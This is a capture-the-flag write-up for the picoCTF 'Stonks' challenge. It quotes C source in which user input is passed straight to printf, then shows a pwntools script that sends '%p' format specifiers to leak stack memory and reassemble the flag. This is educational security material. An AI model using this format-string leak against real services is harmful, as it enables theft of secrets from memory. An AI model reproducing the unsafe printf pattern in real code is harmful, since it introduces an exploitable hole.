## Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 16439

## Solution
In this challenge we are given a service that we should connect via nc.

let's try the service and see how it works:

```bash
$ nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
test
Buying stonks with token:
test
Portfolio as of Wed Mar 13 13:07:07 UTC 2024


4 shares of JXP
1 shares of ZVM
2 shares of KO
14 shares of JBIW
10 shares of CXW
1 shares of W
84 shares of FQ
242 shares of KVVM
1031 shares of FNSI
Goodbye!


$ nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
2

Portfolio as of Wed Mar 13 13:07:16 UTC 2024


You don't own any stonks!
Goodbye!

```
Seem like it doesn' do much. also we are given the source code for the service which is located at `vuln.c` file.
Looking at the source codes, below section gets our attention.

```c
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```

As you can see, `user_buf` is directly inputed in `printf` which make it vulnerable to format string vulnerability.
So the attack scenario now is available, we should read values from stack till we get the flag which is Stored in `FLAG_BUFFER`.

let's verify if we are right by sending a simple payload like `%p`:

```bash
$ nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p
Buying stonks with token:
0x98d7410
Portfolio as of Wed Mar 13 13:10:22 UTC 2024
```

ok let's try to read more values seperated with `.` and finaly put them together to get the flag:
**Note**: the values will be poped in little endian format. so remember to make it back:

```python
import struct
from pwn import *

p = remote('mercury.picoctf.net', 16439)
p.recvuntil('View my portfolio\n')
p.sendline('1')
p.recvuntil('What is your API token?\n')
payload = '%p.'*100
p.sendline(payload)
p.recvline()
leaked_values = p.recvline().decode().strip().split('.')
for item in leaked_values:
	try:
		print(bytes.fromhex(item[2:]).zfill(4)[::-1].decode('ascii'))
	except:
		pass
```
and running this python code will get us:
```bash
$ python solve.py
[+] Opening connection to mercury.picoctf.net on port 16439: Done
pico
CTF{
I_l0
5t_4
ll_m
y_m0
n3y_
c7cb
6cae
0000
[*] Closed connection to mercury.picoctf.net port 16439
```

